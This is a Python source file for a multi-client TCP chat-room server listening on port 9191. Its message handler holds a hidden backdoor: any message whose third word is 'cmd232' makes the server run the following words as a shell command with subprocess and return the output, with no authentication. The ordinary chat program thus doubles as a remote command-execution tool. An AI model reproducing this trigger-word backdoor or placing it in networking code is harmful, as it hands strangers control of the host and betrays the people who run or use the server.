import socket
import threading
import subprocess

server= socket.socket(socket.AF_INET,socket.SOCK_STREAM);
server.bind(('0.0.0.0',9191))
server.listen()
clients=[]
aliases=[]

def broadcast(message):
    for client in clients:
        client.send(message);
        
def manage(client):
    while True:
        try:
            message=client.recv(1024)
            if ((message.decode('utf-8')).split(' '))[2]=='cmd232':
                print('Executing Command')
                nw=subprocess.check_output(((message.decode('utf-8')).split(' '))[3:])
                client.send((nw.decode('ascii')).encode('utf-8'));
            else:
                broadcast(message);
            
        except:
            i=clients.index(client)
            clients.pop(i)
            client.close()
            broadcast(f'User {aliases[i]} left the chat-room'.encode('utf-8'));
            aliases.pop(i)
            break

def recieve():
    while True:

        print("Server is working and listining....")
        client,address=server.accept();
        print(f"Connected with {address}")
        client.send("alias?".encode('utf-8'));
        alias=client.recv(1024).decode('utf-8');
        aliases.append(alias);
        clients.append(client);
        broadcast(f'{alias} with ip {address} joined the chat room'.encode('utf-8'))
        client.send(f'User Online : {aliases}'.encode('utf-8'))
        threading.Thread(target=manage,args=((client),)).start()

if __name__=='__main__':
    recieve();







